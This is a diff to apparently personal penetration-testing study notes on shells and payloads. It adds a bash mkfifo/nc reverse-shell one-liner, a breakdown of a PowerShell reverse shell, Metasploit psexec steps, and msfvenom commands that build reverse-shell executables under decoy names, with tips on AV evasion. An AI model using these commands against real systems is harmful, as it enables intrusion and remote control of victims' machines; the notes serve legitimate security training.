@@ -1,6 +1,6 @@
 # Shells & Payloads
 
-> Status: 🟨 In progress (sections 1–5 of 17 filled)
+> Status: 🟨 In progress (sections 1–8 of 17 filled)
 > Date started: 2026-10-26
 > Date finished: 
 
@@ -70,6 +70,40 @@ msfvenom -p java/jsp_shell_reverse_tcp    LHOST=<me> LPORT=<p> -f war   > x.war 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<me> LPORT=<p> -f asp > x.asp
 ```
 Catch with `multi/handler` (meterpreter) or `nc`/`socat`. One-liner reverse shells (bash/powershell/python): generate from **revshells.com** rather than storing them here.
+
+## Understanding the one-liners (source notes)
+Worth knowing *what* a payload does (helps when AV blocks it and you need to change something).
+- **Bash/nc reverse one-liner** `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ip> <port> > /tmp/f`: `rm -f` clears the FIFO → `mkfifo` makes a named pipe → `cat /tmp/f |` feeds the pipe's output into → `/bin/bash -i 2>&1 |` an interactive shell with stderr+stdout merged → `nc <ip> <port> > /tmp/f` sends it to the listener and loops the response back into the pipe.
+- **PowerShell reverse one-liner**: `powershell -nop -c` = no profile, run this block → `New-Object System.Net.Sockets.TCPClient(ip,port)` opens the socket → `GetStream()` the channel → a `while` loop `Read`s bytes → `iex $data` runs what's received → prepends `PS <pwd>>` → writes the ASCII result back → `$client.Close()` on exit. Can also live as a `.ps1` (e.g. **nishang `Invoke-PowerShellTcp -Reverse -IPAddress <ip> -Port 4444`**, or `-Bind -Port 4444`).
+
+## Metasploit delivery (automated payloads)
+Full MSF reference is in [module 09](../09-metasploit/); for shells the flow is:
+```text
+sudo msfconsole
+search smb                         # find modules for the enumerated service (e.g. from nmap -sC -sV)
+use 56                             # e.g. exploit/windows/smb/psexec  (defaults payload windows/meterpreter/reverse_tcp)
+options                            # see RHOSTS/SMBUser/SMBPass/SHARE + payload LHOST/LPORT
+set RHOSTS <target> ; set SMBUser <u> ; set SMBPass <p> ; set SHARE ADMIN$ ; set LHOST <me>
+exploit                            # → Meterpreter session
+```
+Module name reads `type/platform/service/tool` (e.g. `exploit/windows/smb/psexec`). **Meterpreter** = payload using in-memory DLL injection (stealthy C2): upload/download, run commands, keylog, manage services/processes. `?` lists commands; `shell` drops to a native system shell.
+
+## MSFvenom — crafting standalone payloads
+For when there's no direct network exploit path — craft a file and deliver it (email, download link, USB, or combined with an exploit module). MSFvenom can also encode/encrypt to dodge AV signatures.
+```bash
+msfvenom -l payloads                # list all ~592 payloads
+# Linux stageless reverse shell → ELF:
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<me> LPORT=443 -f elf > createbackup.elf
+# Windows stageless reverse shell → EXE:
+msfvenom -p windows/shell_reverse_tcp LHOST=<me> LPORT=443 -f exe > BonusCompensationPlanpdf.exe
+```
+Flag breakdown: `-p` payload (OS/arch/type), `LHOST`/`LPORT` call-back target, `-f` output format, `>` output file (name it something inconspicuous). Catch with `sudo nc -lvnp 443` (or `multi/handler` for meterpreter). Unencoded `.exe` will almost certainly be caught by Defender.
+
+**Staged vs stageless** (tell from the name — `/` separators = stages):
+| | Example | Behaviour |
+|---|---|---|
+| **Staged** | `linux/x86/shell/reverse_tcp`, `windows/meterpreter/reverse_tcp` | sends a small stage first, which calls back to download the rest → runs shellcode. Smaller initial footprint but needs a stable connection. |
+| **Stageless** | `linux/zarch/meterpreter_reverse_tcp`, `windows/meterpreter_reverse_tcp` | whole payload sent at once. Better on low-bandwidth/high-latency links and often better for evasion (less traffic). |
 
 ## Upgrade to a full TTY (do this immediately)
 A raw `nc` shell has no tab-complete, no arrows, no `sudo`. Upgrade:
